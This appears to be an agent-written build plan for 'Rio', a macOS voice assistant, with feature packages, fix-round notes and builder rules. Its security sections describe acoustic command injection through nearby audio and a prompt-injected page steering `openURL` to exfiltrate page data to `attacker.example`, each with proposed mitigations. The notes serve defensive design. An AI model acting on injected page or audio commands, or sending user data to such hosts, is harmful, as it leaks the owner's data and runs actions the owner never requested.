  and the loop limits with a fake model.

### Builder L: memory, notes, email drafts, math (`feat/rio-actions-l`)
- #22 memory: `remember` / `recall` / `forget`, stored locally in Application Support (JSON,
  file protection, never sent anywhere except as the matched fact when answering). Phrases:
  "remember my locker code is 4321", "what's my locker code", "forget my locker code", "what do
  you remember about me". Recall is local fuzzy match first; the smart resolver may route
  natural questions to `.recall`.
- #26 `.draftEmail`: open a compose window in the default mail app (Mail via NSAppleScript with
  parameters, never user text in the source; Gmail in the browser via a
  `https://mail.google.com/mail/?view=cm&to=…&su=…&body=…` URL when the default handler is a
  browser). NEVER sends. The smart resolver writes the body from "email Professor Kim that I'll
  be late to office hours"; resolve the recipient from Contacts when it's a name.
- #27 `.addNote`: append to an Apple Notes note named "Rio Notes" (create it if missing) via
  NSAppleScript with parameters. Phrases: "note: …", "take a note …", "add to my notes …".
- #28 `.calculate`: a pure, local evaluator. Arithmetic with + − × ÷ ^ %, parentheses, "15% of
  84", "a third of 90", spoken numbers ("two hundred and five"), unit conversions (length, mass,
  volume, temperature, speed, data, time) and time zones ("9 AM Doha time here", "what time is
  it in Doha"). Instant and offline. Never `NSExpression` on raw user text; write a small
  tokenizer and parser.
- Tests for all four (memory store round-trip with a temp dir, phrase parsing, the email URL
  and AppleScript parameter builders, and 80+ calculator cases).

### Builder M: live translator and Arabic commands (`feat/rio-actions-m`)
- #30 translator mode: "translate what's being said" / "start translating" →
  `.startTranslation`. Mic chunks are cut on pauses (VAD, 0.6–6 s), each sent to Groq Whisper
  (the same transcription service/config Rio uses) with language detection, then translated by
  the configured LLM. Non-English → English, English → Arabic (setting: "my other language",
  default Arabic). Live subtitles in a small caption panel next to the corner bear (last 3 lines,
  original small and translation large, excluded from screen capture by default like the bear).
  "say it" → `.speakLastTranslation` speaks the last translation through `RioVoice` in that
  language's voice. "stop translating" / Esc / three-finger tap → stop; auto-stop after 10 min of
  silence. Pauses while Rio is speaking (no feedback loop) and while dictation or the action key
  is active. The bear wears headphones while it's on (expose `RioTranslatorMode.shared.isOn` for
  the companion; the lead wires the art if needed). Disclosure: audio is sent to the
  transcription provider while translating.
- Conversation mode's wake listener is on-device en-US, so Arabic spoken after "Rio" won't
  transcribe well there. When online, re-transcribe the command audio after the wake word with
  Whisper (coordinate through `RioConversationMode`/`WakeWordListener`, C's files; M may edit
  WakeWordListener.swift for this hook only). The action key path already uses Whisper, which is
  multilingual.
- Arabic (and any non-English) commands: on the action key and in conversation mode, when the
  transcript isn't English (the existing spoken-language detection or Whisper's language),
  translate it to English (Groq Whisper's `/audio/translations` for audio, or the LLM for text)
  BEFORE parsing, so "ريو افتح كروم" → "Rio open Chrome". Add a small built-in Arabic verb table
  for the common commands (افتح/شغل/سكر/علي الصوت/وطي الصوت…) so those work even offline.
- Tests: chunking and VAD logic on synthetic buffers, the direction rules, the Arabic verb table,
  and that English transcripts are never sent for translation.

## Open security item for the audit/fix round

Automated review (2026-11-03) flagged acoustic command injection in conversation mode: any audio
near the mic that says "Rio, …" (a video, someone in the room) reaches the action pipeline.
Already mitigated: the "Rio" prefix is required, it pauses while another app uses the mic (calls),
it pauses while Rio speaks, messages, replies and Empty Trash always confirm, and it shuts off
after 5 minutes idle. To do in the fix round: commands that come from conversation mode and inject
input or change data (`typeText`, `pressKeys`, `fillField`, `click`, clipboard `pasteRecent`,
`runTask`, `systemToggle`, `quitApp`) need a spoken "yes" (or Return) after Rio reads the action
back, but ONLY when the owner turns OFF "Trust conversation mode" in Settings. **Owner decision
(2026-11-03): "Trust conversation mode" is ON by default**, so by default these run without the
spoken "yes"; the toggle is there to switch the check on. Action-key commands are
unaffected (the key itself proves it was the owner).

## Fix-round notes (collected by the lead during merges)
- "go back" alone is B's media "previous track". When a browser is frontmost it should mean page
  back. Make the executor context-aware (browser frontmost → `.browser(.back)`).
- Builder I: Night Shift "enabled vs active" semantics, scroll direction and Wi-Fi via
  `networksetup` without admin all need live confirmation.

- SECURITY (task agent, from automated review): an injected page can steer `openURL` to
  `attacker.example/?d=<page data>`. In `RioTaskSafety.risk` for `.openURL`: confirm when the
  host differs from the current page's host AND the host's registrable domain isn't mentioned in
  the goal; also confirm when the path or query contains personal details
  (`hasPersonalDetails`) or long free-text runs that aren't in the goal. The first navigation
  to a site named in the goal stays unconfirmed. Add tests.

- OWNER-REPORTED (16:00): the action key heard "open chrome" as "We are hoping for a win." (a
  Whisper hallucination; at 15:27 "Rio, open Chrome." worked). Fix: (1) on `.unknown`, the bear and
  Rio's voice say what was heard ("I heard '…'. Try again?") instead of "I don't know how to do
  that yet"; (2) action-key sessions give Whisper a command-biased prompt (installed app names +
  command verbs, kept within the prompt budget); (3) a hallucination guard for action AND
  dictation sessions: a mostly-silent recording (speech gate), or a transcript matching known
  Whisper hallucinations ("Thanks for watching", "MBC 뉴스…", "We are hoping for a win", subtitle
  credits…) → "I didn't catch that", nothing typed or run.
- Tester misroutes (397-phrase corpus): "go back" (browser when a browser is frontmost),
  bare "stop" with no timer (stop music/speech only), "press tab" → key, "open the website X dot
  com" host bug, "go to amazon and search for X" → site search, chained app names ("open chrome
  and safari", "quit Chrome and Safari"), "exit full screen" → ⌃⌘F, unmatched "open X" with no
  installed app should go to the smart resolver (not openApp), "show desktop", "click the blue
  button" keeps colour as a hint, mid-sentence fillers ("uh"), name mishearings ("Ria", "Rio's"),
  "paste the link/address", offline email phrases → local draftEmail, Arabic table gaps
  (الحاسبة Calculator, timers, help, search, time left).
- Idle CPU measured 4–5% while asleep (machine was loaded): profile and cut it to near zero.
- The Dock-click run is on branch feat/rio-dock-click (333edc5): merge it.

- OWNER CHANGE (2026-11-03): replace the three-finger trackpad tap with a KEY CHORD: **left Fn +
  left Control (keyCode 59) + left Option (keyCode 58) pressed together, then released** toggles
  conversation mode (and stops the live translator while it's on). Fn + Control stays the action
  key; Fn alone stays dictation; Right Option (61) stays tap-to-toggle dictation; right Control
  (62) and right Option (61) must NOT form the chord. Detect it in ShortcutMatcher as a new event
  (e.g. `.conversationChord`) that fires once per press of all three. If the Fn hold or Fn+Control
  action session already started, cancel it silently: no paste, no action, audio discarded, the
  bear doesn't show an error. Add regression tests for every key order and for the existing Fn,
  Fn+Control, Right Option and Right Command behaviour. Remove ThreeFingerTapMonitor usage
  (D's conversation mode and M's translator) and the trackpad setting; delete the
  MultitouchSupport files (no private trackpad API anymore). Update Settings text, the help
  catalogue, Info and docs.

- OWNER CHANGE (2026-11-03): hands-free (tap-to-toggle) dictation moves from Right Option to an
  **Fn double-tap**: a short Fn tap (<0.3 s held), then a second Fn press within ~0.35 s, starts
  hands-free dictation (the first short tap's recording is discarded by the existing speech gate,
  never pasted); a single Fn tap (or double-tap) stops it. Fn hold stays push-to-talk;
  Fn+Control stays the action key; left Fn+Control+Option stays the conversation chord. Right
  Option is freed (no longer a toggle default); migrate the owner's saved `toggle_shortcut`
  (currently Right Option, keyCode 61) to the new Fn double-tap binding, and show it in Settings
  as "Double-tap Fn". The lead already set macOS's Fn key to "Do Nothing"
  (`com.apple.HIToolbox AppleFnUsageType = 0`) so the emoji picker no longer pops up; the emoji
  picker remains on Control+Command+Space. Regression tests: hold, double-tap, tap-then-hold
  timing, Fn+Control, the chord, and Right Command Fix Last.

## Wave 4 (after this build is tested and shipped)

Owner picks: #32 text Rio from your iPhone (Messages from the owner's own handle only, risky
actions still confirm on the Mac), #33 "Rio, watch me" (record a named macro of
clicks/keys/app switches, then replay it), #34 follow-ups and pronouns ("open it again", "do the
same for Spotify", "send that to Ali too"), #38 "find that thing" search (Messages
attachments + Mail + Downloads + Spotlight, filtered by person and time), #39 clean up Downloads
(show the plan, confirm, then move/rename), #41 meeting copilot (rolling 5 min of call audio kept
on the Mac only, off by default, with a visible recording badge on the bear; "what did they just
say", "action items").

## Wave 5 (after wave 4)

Owner picks: #44 voice-edit the last dictation ("Rio, make that more formal / shorter / add a
thank-you / fix the grammar", rewritten in place without selecting), #48 scheduled commands
("every weekday at 8:50 open Zoom and my MAT108 notes", "at 5 PM remind me to call Ali and open
WhatsApp"), #49 triggers (external monitor plugged in, AirPods connected, joined a Wi-Fi network →
run commands), #52 ("definitely") the corner bear follows the owner to whichever screen they're
actually working on.

## Wave 5 additions (owner picks, 2026-11-03)

- #55 Write for me: "Rio, write a reply saying I'll send it tomorrow, keep it friendly"
  composes text (not verbatim) and types it into the focused field.
- #56 Smart paste: "paste that as bullet points / in Arabic / more formally" transforms the
  clipboard while pasting.
- #57 Copy text from anything on screen: "copy the text from this image/video/PDF" via on-device
  Vision OCR (Live Text). Nothing leaves the Mac.
- #58 Weather and news: real data. Weather from Open-Meteo (free, no key); news through the
  provider's web-search-capable model, disclosed.
- #59 Drive Claude Code by voice: "tell Claude to fix the failing test", "approve that", "what's
  Claude doing?" against the owner's Claude Code session in Warp.

- #65 Your writing style: learn the owner's phrasing, emoji use and formality from their past
  dictations (local only) and apply it to cleanup and "write for me".
- #70 Personal timeline search: "what was that restaurant Ali mentioned yesterday?" searches the
  owner's own dictation history, locally (respect the M4 redaction rules; only dictation text).
- #73 App integrations: Spotify ("play my Discover Weekly"), Notion ("add this to my Hala
  roadmap"), Canvas (assignments), each with its own consent and token in the Keychain.

## Waves 4–5: the last Rio 2.0 features (contract v4)

Owner (2026-11-03): "these are the last features to be added... build out all this as part of rio
2.0 then we will go from there." Base: branch `feat/rio-actions` after the fix round.

What the lead already wired:
- v4 cases are in `RioActionTypes.swift` (`MeetingCommand`, `ClaudeCodeCommand`).
- `.organizeDownloads` and `.claudeCode(.approve)` always confirm.
- The undo plan marks every v4 case.
- Phrase order (`RioExtraPhrases`): M, O, P, T, S, Q, N, then E, J, G, H, L, I, K.
- Handler and phrase stubs per area.
- `RioCommandSource.automation` (owner's schedules, triggers and macros; like the action key) and
  `.phone` (iPhone texts; anything needing confirmation is refused).
- `AppState.runRioCommandText(_:source:)` is the entry point for non-key, non-mic commands.

Every builder:
- Owns its stubs plus new files `Rio<Area>*.swift`.
- Exposes a `Rio<Area>SettingsSection` (the lead embeds it).
- Does NOT edit AppState, SettingsView, MenuBarView, the coordinator or other areas' files unless
  its package says so. Otherwise it reports the exact change it needs.
- Keeps every network use disclosed and toggleable.

### N: context and memory (`feat/rio-w5-n`): #34 follow-ups, #70 timeline search, #65 writing style
- **#34 Follow-ups.**
  - "open it again", "do the same for Spotify", "close that", "make it bigger", "send that to Ali too".
  - Use a pure pronoun/follow-up rewriter over the last command context. N may edit
    RioActionCoordinator.swift to expose that context (last actions, app and target).
- **#70 `.searchHistory(query:)`.**
  - Search the owner's own DICTATION history (`PipelineHistoryStore`), locally only.
  - Rank by match plus recency, and answer "On Monday you said: …".
- **#65 Style profile.**
  - Build a local profile from recent dictations: phrasings, emoji, capitalisation, sign-offs,
    formality, Arabic/English mixing.
  - Feed it into the cleanup prompt (PostProcessingService.swift; N may edit it for this only)
    and into O's write-for-me via a pure `RioStyleProfile` API.
  - Settings: on/off, a "what Rio learned" preview, reset.

### O: writing (`feat/rio-w5-o`): #44 edit last dictation, #55 write for me, #56 smart paste
- **#44 `.editLastDictation(instruction:)`.**
  - "make that more formal / shorter / add a thank-you / fix the grammar / in Arabic".
  - Rewrite in place, re-using the "Undo last dictation" selection machinery. O may add a NEW
    file `AppState+RioWriting.swift` (extension). If it needs private members, report the exact
    change instead.
- **#55 `.writeForMe(instruction:)`.**
  - Compose with the LLM (using N's `RioStyleProfile` if present) and type into the focused field.
  - Never into terminals (`RioImprovePolicy`).
- **#56 `.smartPaste(instruction:)`.** Transform the clipboard text, paste it, and restore the
  clipboard.
- Disclose all three in a `RioWritingSettingsSection`.

### P: automation (`feat/rio-w5-p`): #48 scheduled commands, #49 triggers, #33 "watch me" macros
- **#48 `.scheduleCommand(command:, when:)`.**
  - Use H's `RioDateTimeParser` plus recurrence (daily, weekdays, weekly).
  - Local JSON at 0600, a timer that survives sleep (check on wake), running via
    `AppState.runRioCommandText(_, .automation)`. P gets this through a closure injected at
    launch; report the one-line AppDelegate hook.
- **#49 `.addTrigger(command:, trigger:)`.**
  - Display connect (NSScreen notifications), audio output device such as AirPods (CoreAudio),
    and Wi-Fi SSID (CoreWLAN; it needs Location on macOS 14+, so ask only when a Wi-Fi trigger is
    created).
- **`.listAutomations` / `.removeAutomation(name:)`.**
- **#33 `.recordMacro(name:)` / `.stopRecordingMacro` / `.runMacro(name:)`.**
  - Record app switches, clicks (the AX label at the point, as `.click`), allow-listed keys and
    typed text into closed-set RioActions.
  - Never inside secure fields or password managers.
  - Replay with `.automation`.
  - Publish `RioMacroRecorder.shared.isRecording` for a bear badge.
- Settings: list and delete automations and macros.

### Q: finding and files (`feat/rio-w5-q`): #38 find that thing, #39 Downloads cleanup, #57 copy text from screen
- **#38 `.findThing(query:)`.**
  - Search Spotlight (H's RioFilesSearch), Messages attachments (~/Library/Messages/Attachments,
    which needs Full Disk Access; detect it and explain), Mail downloads and Downloads.
  - Filter by person (Contacts → handles) and time; show a results panel and speak the best one.
- **#39 `.organizeDownloads`** (confirmed).
  - Plan moves by type into subfolders and give obvious renames.
  - Show the plan in the confirmation. Never delete.
  - Keep a move log so "undo" moves everything back.
- **#57 `.copyTextFromScreen`.** Front-window capture (J's RioScreenCapture), on-device Vision OCR
  (en and ar), copy the text and say how much. Nothing leaves the Mac.

### S: outside world (`feat/rio-w5-s`): #58 weather and news, #73 integrations, #32 iPhone texting
- **#58 Weather and news.**
  - Weather: Open-Meteo (free, no key, with its geocoding; a default place in Settings).
  - News: the provider's web-search-capable model (check ModelConfiguration for a Groq
    compound/search model), else say it's unavailable.
  - Short spoken answers.
- **#73 Integrations.** Tokens go in the Keychain via `RioIntegrationsSettingsSection`, with setup steps.
  - `.playMusic(query:)`: Spotify Web API (OAuth PKCE, loopback redirect, owner-registered client
    ID); Apple Music `music://` search as the fallback.
  - `.notionAdd(text:, page:)`: Notion internal integration token.
  - `.canvasDue(range:)`: Canvas token plus base URL (default https://canvas.ucdavis.edu).
- **#32 iPhone texting.**
  - Watch ~/Library/Messages/chat.db read-only (Full Disk Access; detect it and show steps) for
    NEW self-sent messages starting with "Rio".
  - Run them via `runRioCommandText(_, .phone)`.
  - Reply with the result to the owner's own handle.
  - Off by default.

### T: meetings and Claude Code (`feat/rio-w5-t`): #41 meeting copilot, #59 Claude Code by voice
- **#41 `.meeting(...)`**, off by default.
  - Keep a rolling 5 minutes of ScreenCaptureKit system audio plus the mic, in memory only.
  - Publish `RioMeetingCopilot.shared.isRecording` for a bear badge.
  - "what did they just say" transcribes the last ~60 s (Whisper) and summarises. "action
    items" / "recap" use the LLM.
  - It auto-stops at the end of the call or after 2 hours.
  - Audio is sent only when asked, and that's disclosed.
- **#59 `.claudeCode(...)`.**
  - Find the owner's Claude Code session (a Warp or Terminal window showing Claude Code).
  - `.send`: focus, paste and press Return.
  - `.status`: read the visible text via Accessibility and summarise it.
  - `.approve` / `.deny`: send the key the visible permission prompt expects. `.approve` always
    confirms, showing the prompt.

## Rules for every builder
- Read `AGENTS.md` first and follow it. No new dependencies, no SPM/Xcode project. Swift 6.2
  toolchain, deployment target macOS 13, `-warnings-as-errors`. Use `#available` for newer APIs.
- Build and test with `PATH=/usr/bin:$PATH make check` (conda's codesign shadows Apple's). New
  test files need registering in `Tests/TestMain.swift` and their production sources in
  `TEST_PRODUCTION_SOURCES` in the Makefile. Keep testable logic in pure files without AppKit.
- Tests never touch the network, the real mic, the real trackpad or real apps.
- Privacy: never log or persist transcripts, selected text or contacts. No telemetry.
- Do NOT install into /Applications, quit the running Rio Dictate, change system permissions,
  push, or touch other branches. Commit to your own branch only, with conventional messages
  ending in `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`. Plain `git commit`
  (`--no-verify` is blocked by a hook; the repo has no git hooks anyway).
- A "Fact-Forcing Gate" hook may block Write/Edit/Bash until you state some facts (callers,
  affected APIs, the user's instruction). State them briefly and retry. The user's instruction
  is: "Deploy multiple agents to build this and then you can have a separate agent test it,
  make sure it is accurate, and do an audit of errors and stuff before you give me the final
  product." Wave 2 adds: "Do all that right now before the build goes out and test everything
  thoroughly."
- Finish with: files added/changed, test count added, `make check` result, anything
  stubbed, any contract change you need, and anything you could not verify.

## After the waves
1. A separate **tester** agent builds the merged app and exercises it on the real Mac (parser
   corpus, open/quit/switch safe apps, websites, volume set-and-restore, window placement on
   TextEdit, conversation mode with `say` through the speakers). It never locks the screen,
   sends a message, or quits the owner's apps.
2. An **Opus 5.5 auditor** reviews the full diff for correctness, safety (closed action set,
   no injection into Process/AppleScript), privacy, concurrency and regressions in dictation.
3. A **fixer** addresses the confirmed findings, and the lead re-verifies the fix diff, runs
   `make check`, builds the signed Rio Dictate.app (build 116+), installs it and does a final
   smoke test.
